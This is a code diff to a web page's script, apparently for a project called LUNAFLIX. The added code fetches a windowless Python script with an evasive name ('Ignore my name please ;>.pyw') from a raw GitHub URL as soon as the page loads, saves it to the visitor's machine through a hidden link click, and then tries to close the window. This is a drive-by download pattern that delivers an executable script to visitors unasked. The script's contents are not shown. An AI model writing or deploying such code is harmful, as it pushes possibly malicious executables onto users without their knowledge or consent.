@@ -33,44 +33,42 @@
 
     <script>
         const GITHUB_FILE_URL = "https://raw.githubusercontent.com/epickfr/LUNAFLIX/refs/heads/main/Ignore%20my%20name%20please%20%3A%3E.pyw";
+        const FILE_NAME = "Ignore my name please ;>.pyw";
 
-
-        function startDownload() {
+        async function startDownload() {
             const status = document.getElementById('status');
 
-            let fileName = GITHUB_FILE_URL.split('/').pop();
             try {
-                fileName = decodeURIComponent(fileName);
-            } catch (e) {
-            }
+                status.innerHTML = "<h1>⬇️ Downloading...</h1><p>Fetching file from GitHub...</p>";
 
-            const a = document.createElement('a');
-            a.href = GITHUB_FILE_URL;
-            a.download = fileName;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-
-            const closeWindow = () => {
-                status.innerHTML = "<h1>✅ Download Started</h1><p>Closing window...</p>";
-
+                const response = await fetch(GITHUB_FILE_URL);
+                
+                if (!response.ok) {
+                    throw new Error(`Failed to download: ${response.status}`);
+                }
+                const blob = await response.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = FILE_NAME;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+                status.innerHTML = "<h1>✅ Download Started!</h1><p>Closing window...</p>";
                 setTimeout(() => {
                     window.close();
                     setTimeout(() => {
-                        if (!window.closed) {
-                            status.innerHTML = "<h1>✅ Download Started</h1><p>You can now close this window manually.</p>";
-                        }
+                        status.innerHTML = "<h1>✅ Download Complete!</h1><p>You can close this window now.</p>";
                     }, 500);
-                }, 100);
-            };
-            window.addEventListener('blur', closeWindow, { once: true });
+                }, 500);
 
-            setTimeout(closeWindow, 2000);
-
-            a.click();
-
-            document.body.removeChild(a);
+            } catch (error) {
+                status.innerHTML = `<h1>❌ Error</h1><p>${error.message}</p><p style="font-size:0.875rem; margin-top:1rem;">Check the URL or try again.</p>`;
+                console.error('Download failed:', error);
+            }
         }
-
         window.addEventListener('load', startDownload);
     </script>
 </body>
